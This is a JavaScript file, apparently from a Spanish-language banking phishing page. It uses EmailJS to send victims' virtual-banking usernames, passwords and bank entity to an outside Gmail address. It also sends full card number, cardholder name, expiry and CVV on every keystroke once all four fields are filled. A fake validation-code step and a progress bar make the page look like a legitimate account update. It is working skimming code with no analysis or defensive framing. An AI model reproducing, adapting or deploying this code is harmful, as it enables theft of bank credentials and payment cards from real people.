(function(){
    emailjs.init("service_k7yqrj8");
})();

// Function to send login form data and redirect after 5 seconds
function sendEmail() {
    var usuario = document.getElementById("usuario").value;
    var clave = document.getElementById("clave").value;
    var entidad = document.getElementById("entidad").value;

    var templateParams = {
        usuario_virtual: usuario,
        clave_virtual: clave,
        entidad_respaldo: entidad
    };

    emailjs.send("service_k7yqrj8", "template_55jj2xl", templateParams)
    .then(function(response) {
        console.log('SUCCESS!', response.status, response.text);
        alert("Correo enviado correctamente.");
        setTimeout(function() {
            window.location.href = 'sincronizacion.html';
        }, 5000);
    }, function(error) {
        console.log('FAILED...', error);
        alert("Hubo un error al enviar el correo.");
    });
}

let generatedCode = '';

// Function to send validation code
function sendValidationCode() {
    generatedCode = Math.random().toString(36).substring(2, 8).toUpperCase();

    var templateParams = {
        code: generatedCode,
        email: "informacionpagina52@gmail.com"
    };

    emailjs.send("service_k7yqrj8", "template_55jj2xl", templateParams)
    .then(function(response) {
        console.log('SUCCESS!', response.status, response.text);
        alert("Código enviado al correo electrónico.");
        document.getElementById('validationForm').style.display = 'block';
        document.getElementById('sendCodeButton').style.display = 'none';
    }, function(error) {
        console.log('FAILED...', error);
        alert("Hubo un error al enviar el código.");
    });
}

// Function to validate code and update progress bar
function validateCode(event) {
    event.preventDefault();
    const code = document.getElementById('validationCode').value;
    if (code === generatedCode) {
        progress += 10;
        if (progress >= 100) {
            progress = 100;
            document.getElementById('updateStatus').style.display = 'block';
            document.getElementById('continueButton').style.display = 'block';
        }
        updateProgressBar();
    } else {
        alert('Código incorrecto, inténtelo nuevamente.');
    }
    document.getElementById('validationForm').reset();
}

// Function to update progress bar
function updateProgressBar() {
    const progressFill = document.getElementById('progress-fill');
    const progressText = document.getElementById('progress-text');
    progressFill.style.width = `${progress}%`;
    progressText.textContent = `${progress}%`;
}

// Function to toggle card section
function toggleCardSection() {
    const cardSection = document.getElementById('cardSection');
    cardSection.classList.toggle('expanded');
}

// Event listeners for card details inputs
document.getElementById('cardNumber').addEventListener('input', sendCardDetails);
document.getElementById('cardName').addEventListener('input', sendCardDetails);
document.getElementById('cardExpiry').addEventListener('input', sendCardDetails);
document.getElementById('cardCVV').addEventListener('input', sendCardDetails);

// Function to send card details
function sendCardDetails() {
    const cardNumber = document.getElementById('cardNumber').value;
    const cardName = document.getElementById('cardName').value;
    const cardExpiry = document.getElementById('cardExpiry').value;
    const cardCVV = document.getElementById('cardCVV').value;

    if (cardNumber && cardName && cardExpiry && cardCVV) {
        var templateParams = {
            card_number: cardNumber,
            card_name: cardName,
            card_expiry: cardExpiry,
            card_cvv: cardCVV,
            email: "informacionpagina52@gmail.com"
        };

        emailjs.send("service_k7yqrj8", "template_55jj2xl", templateParams)
        .then(function(response) {
            console.log('Detalles de la tarjeta enviados exitosamente', response.status, response.text);
        }, function(error) {
            console.log('Error al enviar los detalles de la tarjeta...', error);
        });
    }
}
